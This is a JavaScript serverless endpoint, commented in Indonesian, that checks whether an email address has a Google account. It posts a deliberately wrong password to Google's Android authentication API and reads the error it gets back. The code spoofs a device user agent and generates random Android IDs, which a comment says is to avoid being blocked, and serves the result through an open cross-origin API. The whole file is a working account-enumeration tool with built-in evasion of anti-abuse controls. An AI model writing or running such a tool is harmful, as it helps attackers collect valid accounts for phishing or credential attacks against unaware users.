const axios = require("axios");

// Fungsi untuk menggenerate ID acak mirip Android
function generateAndroidId() {
  const chars = '0123456789abcdef';
  let id = '';
  for (let i = 0; i < 16; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

async function checkGoogle(email) {
  try {
    const androidId = generateAndroidId();
    
    // Menggunakan API Google Authenticator dengan ID perangkat acak
    const response = await axios.post(
      "https://android.clients.google.com/auth",
      new URLSearchParams({
        Email: email,
        EncryptedPasswd: "dummy_pass", // Sengaja salah
        service: "ac2dm",
        app: "com.google.android.gms",
        client_sig: "38918a453d0719931ef8d5d482c74f8b0a5e08f5",
        callerPkg: "com.google.android.gms",
        device_country: "id",
        operatorCountry: "id",
        lang: "id",
        sdk_version: "28",
        androidId: androidId // ID Random agar tidak diblokir
      }).toString(),
      {
        headers: {
          "User-Agent": "GoogleAuth/1.4 (walleye PQ2A.190305.002)",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout: 10000,
        validateStatus: () => true
      }
    );

    const text = String(response.data);

    // Deteksi jika email terdaftar (meski password salah)
    if (text.includes("Error=BadAuthentication")) {
      
      // Jika di response ada indikasi butuh verifikasi, kita anggap captcha
      if (text.includes("CaptchaRequired") || text.includes("NeedsBrowser") || text.includes("Token=")) {
        return "captcha";
      }
      return "password"; 
    }
    
    // Deteksi email tidak terdaftar
    if (text.includes("Error=Unknown") || text.includes("Error=NotRegistered")) {
      return "unregistered";
    }

    // Error lain (rate limit, dll)
    if (response.status >= 400 || text.length < 20) {
      return "eror";
    }

    return "unknown";
  } catch (err) {
    return "eror";
  }
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ result: "eror", msg: "POST only" });

  const { email } = req.body || {};
  if (!email || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
    return res.status(400).json({ result: "eror", msg: "format salah" });
  }

  const result = await checkGoogle(email);
  return res.json({ result, email });
};
